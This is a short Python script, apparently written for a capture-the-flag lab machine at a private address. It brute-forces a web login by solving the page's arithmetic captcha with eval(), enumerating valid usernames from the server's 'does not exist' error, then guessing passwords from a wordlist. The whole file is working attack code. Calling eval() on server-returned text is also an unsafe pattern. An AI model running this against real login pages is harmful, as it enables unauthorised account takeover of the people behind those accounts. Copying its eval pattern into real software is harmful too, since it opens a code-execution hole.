import requests,re

url = 'http://10.10.123.43/login'
regex = r'(\d+\s*[\+\-\*\/]\s*\d+)\s*\=\s*\?'

with open('usernames.txt','r') as file:
    usernames = file.read().splitlines()

with open('passwords.txt','r') as file:
    passwords = file.read().splitlines()

def send(username,password,captcha):
    data = {
        'username' : username,
        'password' : password,
        'captcha' : captcha
    }
    response = requests.post(data=data,url=url)
    return response

for i in range(1,100):
    check = send('rachel','football','199')
    match = re.search(regex,check.text)
    if not match:
        continue
    else:
        print("CAPTCHA INITIALIZED")
        captcha = eval(match.group(1))
        print(f'captcha = {match.group(1)} , solution = {captcha}')
        break
    

for username in usernames:
    #print(f'trying {username} , {captcha}')            #unhash for live debugging
    check = send(username,' ',captcha)
    
    if not 'does not exist' in check.text:
        print(f'user found {username}')
        user = username
        break
    
    match = re.search(regex,check.text)
    captcha = eval(match.group(1))
    #print(f'captcha = {match.group(1)} , solution = {captcha}')         #unhash for live debugging

print('PASSWORDS TRYING:')
for password in passwords:
    match = re.search(regex,check.text)
    captcha = eval(match.group(1))
    #print(f'captcha = {match.group(1)} , solution = {captcha}')         #unhash for live debugging
    check = send(user,password,captcha)
    #print(password)      #unhash for live debugging
    if not 'Invalid password for user' in check.text:
        print("PASSWORD FOUND")
        print(f'{user} : {password}')
        break







